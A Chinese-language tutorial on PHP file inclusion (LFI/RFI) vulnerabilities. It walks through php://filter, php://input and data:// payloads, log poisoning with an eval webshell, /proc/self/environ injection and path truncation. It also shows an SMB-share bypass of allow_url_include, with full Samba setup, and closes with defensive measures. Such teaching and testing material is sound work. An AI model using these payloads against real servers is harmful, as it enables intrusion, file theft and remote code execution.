文件包含

  • 只要文件被包含了，无论什么都会被当成PHP代码执行
  • PHP默认不会开启远程文件包含，想要开启需要在配置文件中添加 allow_url_include=on;
  • windows也可以通过SMB服务开启某个设置来绕过allow_url_include=on;达到远程文件包含的效果

本地文件包含 ：简称 LFI ，指包含服务器上的资源

远程文件包含 ：简称 RFI ，指通过http协议包含其他地方的资源

函数介绍

include() : 如果包含的文件不存在，不会影响后面的代码执行

require() : 如果包含的文件不存在，会影响后面的代码执行

include_once()、require_once() : 如果文件被包含过一次，就不会再次包含

php伪协议

php内置很多url风格的封装协议，类似于fopen()、copy()、file_exists()和filesize()的文件系统函数

PHP: 支持的协议和封装协议 - Manual

协议说明
file://访问本地文件系统
http://访问http(s)网址
ftp://访问ftp(s)urls
php://访问各个输入/输出流(I/O)
zlib://压缩流
data://数据
ssh2://Secure Shell 2
expect://处理交互式的流
glob://查找匹配的文件路径格式

php://filter

对本地磁盘文件进行读写

  1. 使用条件
allow_url_fopen on/off
allow_url_include on/off
  1. php伪协议读取文件
php://filter/read/convert.base64-encode/resource=/etc/passwd

php://input

文件输入流（POST请求）

  1. 使用条件
allow_url_fopen on/off
allow_url_include on
  1. 利用方法
POST xxx.xxx.com?file=php://input
    
<?php phpinfo();?>

data://

  1. 使用条件
allow_url_fopen on
allow_url_include on
  1. 利用方法
xxx.xxx.com?file=data://text/plain,<?php phpinfo();?>
xxx.xxx.com?file=data://text/plain;base64,Jmx0Oz9waHAgcGhwaW5mbygpOz8mZ3Q7

other

zip协议读文件

zip:///var/www/html/test.zip#test.php // 会读取test.php文件

phar协议都文件（前提是存在压缩包）

phar:///var/www/html/test.zip/test.php

包含数据库

数据库如何存储数据 ?

  1. 文件结构 : index库、one表、name字段
  2. 保存结构 : 在mysql的文件夹下的data目录有个index文件夹，index文件夹有个one.frm文件，这个文件里面有个name字符

包含日志文件

web服务器，基本上把请求写入到他的日志文件中，有的是access.log，有的是error.log，所以可以尝试写入一些敏感的数据<?php eval($_REQUEST[8]);?>，然后让访问出错，这个就会被记录到日志文件中，利用本地包含这个日志文件，相当于得到了shell，前提是得对日志文件有读的权限

包含/proc/self/environ

这个文件是一个存放最新的环境变量信息的文件，是由apache服务器被访问时，会去更新的一个文件，更新其中的User-Agent信息，所以可以考虑吧在User-Agent中注入代码,然后包含这个文件获得shell

截断包含

这种方法只适合于magic_quotes_gpc=off的时候，在PHP老版本中也是存在一些其他截断问题

index.php?file=1.txt////////////////////…………………… （超过一定数据的/）

绕过远程文件限制

在PHP的配置文件中，默认将allow_url_include设置为Off，来限制PHP去加载远程的HTTP/FTP文件，这也有效的防御了远程文件包含，尽管PHP设置了allow_url_include和allow_url_fopen为Off，但是没有阻止下载SMB URL

当存在漏洞的PHP应用程序从攻击者控制的SMB共享机器上下载PHP Webshell时，SMB共享机器应该允许其访问该文件，攻击者应该设置SMB机器可以匿名访问，因此，一旦存在漏洞的应用程序去SMB共享机器上下载PHP Webshell时，SMB服务器不会判断任何身份，就可以成功包含这个webshell

Samba

centos下安装samba服务

先访问远程服务器要包含的文件

很明显包含不了，之后利用SMB绕过

  1. 可以利用rpm安装镜像，也可以使用yum直接安装
rpm -ivh 软件包
或者
yum -y install samba
  1. 建立samba用户数据库文件
useradd mpy pdbedit -a -u mpy 
输入密码
pdbedit -L // 查看mpy是否是samba用户
  1. 关闭防火墙、SELINUX
systemctl stop firewalld
setenforce 0 
iptables -F
  1. 配置samba
vim /etc/samba/smb.conf

[global]
        workgroup = WORKGROUP
        security = user
        username map = /etc/samba/smbusers
        passdb backend = tdbsam

        printing = cups
        printcap name = cups
        load printers = yes
        cups options = raw

[upload]
        path=/upload
        public=yes
        read only=yes
        write list=yes
  1. 创建共享目录
mkdir -m 777 /upload
  1. 启动服务
systemctl start smb

windows的cmd输入 \\samba的IP

再次回到原来报错的地方

http://127.0.0.1:81/mpy-web/include/include.php?8=\192.168.50.137\upload\1.php

成功包含

防御方法

  1. 设置白名单（进行包含的文件设置为一个数组，每次包含时进行匹配）
  2. 过滤危险字符（常见的伪协议 : php、data、file、http……）
  3. 设置文件目录（设置文件目录路由，把目录流量禁用就会显示403）
  4. 关闭危险配置（两个配置文件进行off allow_url_fopen、allow_url_include）
